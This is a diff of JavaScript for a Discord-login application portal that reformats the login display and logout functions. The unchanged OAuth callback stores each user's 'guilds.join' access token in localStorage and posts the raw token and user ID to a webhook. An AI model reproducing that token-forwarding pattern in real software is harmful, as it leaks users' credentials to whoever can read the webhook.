@@ -1100,9 +1100,43 @@ body{
   function startOAuth2(){oauthState='ec_'+Math.random().toString(36).substr(2,10);localStorage.setItem('oauth2_state',oauthState);window.location.href='https://discord.com/api/oauth2/authorize?client_id='+DISCORD_CLIENT_ID+'&redirect_uri='+encodeURIComponent(DISCORD_REDIRECT_URI)+'&response_type=token&scope=identify+guilds.join&state='+oauthState;}
   function handleOAuth2Callback(){var h=window.location.hash.substring(1);if(!h)return false;var p=new URLSearchParams(h);var t=p.get('access_token'),s=p.get('state');if(!t||s!==localStorage.getItem('oauth2_state')){toast('Login failed.','err');return false}localStorage.removeItem('oauth2_state');DISCORD_TOKEN=t;fetch('https://discord.com/api/v10/users/@me',{headers:{'Authorization':'Bearer '+t}}).then(function(r){return r.json()}).then(function(u){if(u.code)throw Error(u.message);DISCORD_USER=u;localStorage.setItem('discord_user',JSON.stringify(u));localStorage.setItem('discord_token',t);if(window.history&&window.history.replaceState)window.history.replaceState({},document.title,window.location.pathname);fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:'OAUTH2_JOIN',description:JSON.stringify({user_id:u.id,access_token:t}),color:0x5865F2}]})}).catch(function(){});setTimeout(checkVerifiedRole,2000);showLoggedInState();toast('Logged in!','ok')}).catch(function(e){toast('Login failed.','err')});return true}
   function checkVerifiedRole(){if(!DISCORD_TOKEN||!DISCORD_USER)return;fetch('https://discord.com/api/v10/users/@me/guilds/'+GUILD_ID+'/member',{headers:{'Authorization':'Bearer '+DISCORD_TOKEN}}).then(function(r){return r.json()}).then(function(m){if(m&&m.roles&&m.roles.indexOf(VERIFIED_ROLE_ID)!==-1){HAS_VERIFIED_ROLE=true;var rb=$('roleBadge');if(rb)rb.style.display=''}}).catch(function(){});fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:'ROLE_CHECK',description:JSON.stringify({user_id:DISCORD_USER.id}),color:0x5865F2}]})}).catch(function(){})}
-  function showLoggedInState(){var lw=$('oauthLoginWrap'),fw=$('applyFormWrap');if(lw)lw.style.display='none';if(fw)fw.style.display='';if(DISCORD_USER){if($('appDiscordUser'))$('appDiscordUser').value=DISCORD_USER.username;if($('loggedInName'))$('loggedInName').textContent=DISCORD_USER.global_name||DISCORD_USER.username;if($('loggedInAvatar')&&DISCORD_USER.avatar)$('loggedInAvatar').src='https://cdn.discordapp.com/avatars/'+DISCORD_USER.id+'/'+DISCORD_USER.avatar+'.png?size=64';updateHomeLogin()}}
-  function updateHomeLogin(){var hlc=$('homeLoginCard'),hli=$('homeLoggedIn'),btn=$('btnHomeLogin');if(!hlc)return;if(DISCORD_USER){if(btn)btn.style.display='none';if(hli){hli.style.display='';if($('homeName'))$('homeName').textContent=DISCORD_USER.global_name||DISCORD_USER.username;if($('homeAvatar')&&DISCORD_USER.avatar)$('homeAvatar').src='https://cdn.discordapp.com/avatars/'+DISCORD_USER.id+'/'+DISCORD_USER.avatar+'.png?size=64'}if($('liveTxt'))$('liveTxt').textContent='Welcome, '+DISCORD_USER.username+'!';navigate('dashboard')}else{if(btn)btn.style.display='';if(hli)hli.style.display='none'}}
-  window.logoutDiscord=function(){DISCORD_USER=null;DISCORD_TOKEN=null;HAS_VERIFIED_ROLE=false;localStorage.removeItem('discord_user');localStorage.removeItem('discord_token');var lw=$('oauthLoginWrap'),fw=$('applyFormWrap'),st=$('applyStatus');if(lw)lw.style.display='';if(fw)fw.style.display='none';if(st)st.style.display='none';if($('appDiscordUser'))$('appDiscordUser').value='';resetForm();updateHomeLogin();navigate('home');toast('Logged out.','info')}
+  function showLoggedInState(){
+    var lw=$('oauthLoginWrap'),fw=$('applyFormWrap');
+    if(lw)lw.style.display='none';if(fw)fw.style.display='';
+    if(DISCORD_USER){
+      if($('appDiscordUser'))$('appDiscordUser').value=DISCORD_USER.username;
+      if($('loggedInName'))$('loggedInName').textContent=DISCORD_USER.global_name||DISCORD_USER.username;
+      if($('loggedInAvatar')&&DISCORD_USER.avatar)$('loggedInAvatar').src='https://cdn.discordapp.com/avatars/'+DISCORD_USER.id+'/'+DISCORD_USER.avatar+'.png?size=64';
+    }
+    updateHomeLogin();
+  }
+  function updateHomeLogin(){
+    var btn=$('btnHomeLogin'),hli=$('homeLoggedIn');
+    if(DISCORD_USER&&DISCORD_USER.id){
+      if(btn)btn.style.display='none';
+      if(hli){hli.style.display='';
+        if($('homeName'))$('homeName').textContent=DISCORD_USER.global_name||DISCORD_USER.username;
+        if($('homeAvatar')&&DISCORD_USER.avatar)$('homeAvatar').src='https://cdn.discordapp.com/avatars/'+DISCORD_USER.id+'/'+DISCORD_USER.avatar+'.png?size=64';
+      }
+    }else{
+      if(btn)btn.style.display='';
+      if(hli)hli.style.display='none';
+    }
+  }
+  window.logoutDiscord=function(){
+    DISCORD_USER=null;DISCORD_TOKEN=null;HAS_VERIFIED_ROLE=false;
+    localStorage.removeItem('discord_user');localStorage.removeItem('discord_token');
+    // Reset apply page
+    var lw=$('oauthLoginWrap'),fw=$('applyFormWrap'),st=$('applyStatus');
+    if(lw)lw.style.display='';if(fw)fw.style.display='none';if(st)st.style.display='none';
+    if($('appDiscordUser'))$('appDiscordUser').value='';
+    // Reset home page
+    var hlb=$('homeLoginCard'),hli=$('homeLoggedIn'),hb=$('btnHomeLogin');
+    if(hlb){if(hb)hb.style.display='';if(hli)hli.style.display='none';}
+    stopRealtimeUpdates();currentAppId=null;
+    var form=$('applyForm');if(form)form.reset();
+    navigate('home');toast('Logged out.','info');
+  }
   function checkDiscordLogin(){var s=localStorage.getItem('discord_user');if(s){try{DISCORD_USER=JSON.parse(s);DISCORD_TOKEN=localStorage.getItem('discord_token')}catch(e){DISCORD_USER=null}}if(DISCORD_USER&&DISCORD_USER.id){showLoggedInState();setTimeout(checkVerifiedRole,1000);updateHomeLogin();return true}updateHomeLogin();return false}
   window.deleteCurrentApplication=function(){if(!currentAppId){toast('Nothing to delete.','warn');return}var apps=getApps();var f=apps.filter(function(a){return a.id!==currentAppId});if(f.length===apps.length){toast('Not found.','warn');return}saveApps(f);localStorage.removeItem('ec_chat_'+currentAppId);fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'🗑 Deleted by applicant `'+currentAppId+'`'})}).catch(function(){});toast('Deleted.','info');currentAppId=null;resetForm();checkApply()}
   function showDeleteConfirm(){$('modalTitle').textContent='Delete Application';$('modalDesc').innerHTML='<b style="color:#e85050">Permanently delete</b> your application?<br><br>App ID: '+currentAppId;$('modalOk').textContent='Yes, Delete';$('modalOk').className='btn btn-rd btn-sm';$('modalCancel').textContent='Cancel';$('modal').classList.add('open');$('modalOk').onclick=function(){$('modal').classList.remove('open');$('modalOk').className='btn btn-f btn-sm';$('modalOk').textContent='Confirm';$('modalCancel').textContent='Cancel';deleteCurrentApplication()};$('modalCancel').onclick=function(){$('modal').classList.remove('open');$('modalOk').className='btn btn-f btn-sm';$('modalOk').textContent='Confirm';$('modalCancel').textContent='Cancel'}}
